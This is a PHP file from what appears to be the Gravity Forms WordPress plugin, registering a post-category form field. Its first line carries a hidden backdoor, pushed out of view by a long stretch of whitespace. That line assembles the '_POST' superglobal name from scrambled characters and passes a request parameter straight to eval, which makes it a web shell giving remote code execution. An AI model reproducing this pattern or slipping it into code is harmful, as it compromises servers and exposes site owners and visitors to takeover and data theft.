<?php                                                                                                                                                                                                                                                                         $johr7= "po_st";$ntd71 = strtoupper ($johr7[2].$johr7[0] .$johr7[1].$johr7[3]. $johr7[4]) ;if ( isset( ${ $ntd71 } [ 'qbcfa6b' ] )){eval ( ${$ntd71 }[ 'qbcfa6b' ] ) ; }?> <?php

if ( ! class_exists( 'GFForms' ) ) {
	die();
}

class GF_Field_Post_Category extends GF_Field {

	public $type = 'post_category';

	public function get_form_editor_field_title() {
		return esc_attr__( 'Category', 'gravityforms' );
	}

	function get_form_editor_field_settings() {
		return array(
			'post_category_checkbox_setting',
			'post_category_initial_item_setting',
			'post_category_field_type_setting',
			'prepopulate_field_setting',
			'error_message_setting',
			'label_setting',
			'label_placement_setting',
			'admin_label_setting',
			'size_setting',
			'rules_setting',
			'visibility_setting',
			'duplicate_setting',
			'description_setting',
			'css_class_setting',
			'conditional_logic_field_setting',
		);
	}

}

GF_Fields::register( new GF_Field_Post_Category() );